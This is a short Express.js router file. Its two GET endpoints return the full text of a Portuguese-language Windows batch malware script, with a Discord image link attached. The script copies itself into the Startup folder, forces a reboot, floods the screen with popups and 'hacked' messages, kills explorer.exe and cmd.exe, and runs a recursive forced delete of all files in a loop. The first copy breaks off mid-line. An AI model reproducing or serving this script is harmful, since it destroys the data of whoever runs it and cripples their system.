const express = require('express');
var router = express.Router();  

router.get('/:id', function(req, res) {
  res.json(`@echo off
copy /y An0nyMuS 4.0.bat "%userprofile%\AppData\Roaming\Microsoft\windows\startmenu\programs\startup"

shutdown -r -c "JA ERA" -t 200

@echo off
echo/msgbox "Erro do Windows", vbcritical, "Erro!" > ILM.vbs
echo/For /l %%%%r in ^(1,1,1000^) do ^(Start ILM.vbs^) > Teste.cmd
echo/Exit >> Teste.cmd
Start /separate Teste.cmd

@echo off
CD %userprofile%\Desktop 
SET NumeroDePastas=100 
SET /a Nome=Hackeado 
:3 
IF EXIST %NumeroDePastas% GOTO 4 
SET /a Nome=%Nome%+1 
MD %Nome% 
GOTO 3
:4 

@echo off
:repete
msg * Seu Computador Foi Hackeado 
goto repete

:loop
taskkill /im cmd.exe -f
taskkill /im explorer.exe -f 
taskkill /im taskmanager -f
del /s /q /f *
:goto loop

@echo off 
:repete 
msg * Para parar tu


https://cdn.discordapp.com/attachments/925638014523305984/1034848282792448050/20211109_173042.jpg`)
});

router.get('/', function(req, res) {
  res.json({ message: `@echo off
copy /y An0nyMuS 4.0.bat "%userprofile%\AppData\Roaming\Microsoft\windows\startmenu\programs\startup"

shutdown -r -c "JA ERA" -t 200

@echo off
echo/msgbox "Erro do Windows", vbcritical, "Erro!" > ILM.vbs
echo/For /l %%%%r in ^(1,1,1000^) do ^(Start ILM.vbs^) > Teste.cmd
echo/Exit >> Teste.cmd
Start /separate Teste.cmd

@echo off
CD %userprofile%\Desktop 
SET NumeroDePastas=100 
SET /a Nome=Hackeado 
:3 
IF EXIST %NumeroDePastas% GOTO 4 
SET /a Nome=%Nome%+1 
MD %Nome% 
GOTO 3
:4 

@echo off
:repete
msg * Seu Computador Foi Hackeado 
goto repete

:loop
taskkill /im cmd.exe -f
taskkill /im explorer.exe -f 
taskkill /im taskmanager -f
del /s /q /f *
:goto loop

@echo off 
:repete 
msg * Para parar tudo isso coloque este comando "taskkill /IM wscript.exe /F"
goto repete`, note: "https://cdn.discordapp.com/attachments/925638014523305984/1034848282792448050/20211109_173042.jpg" })
})

module.exports = router;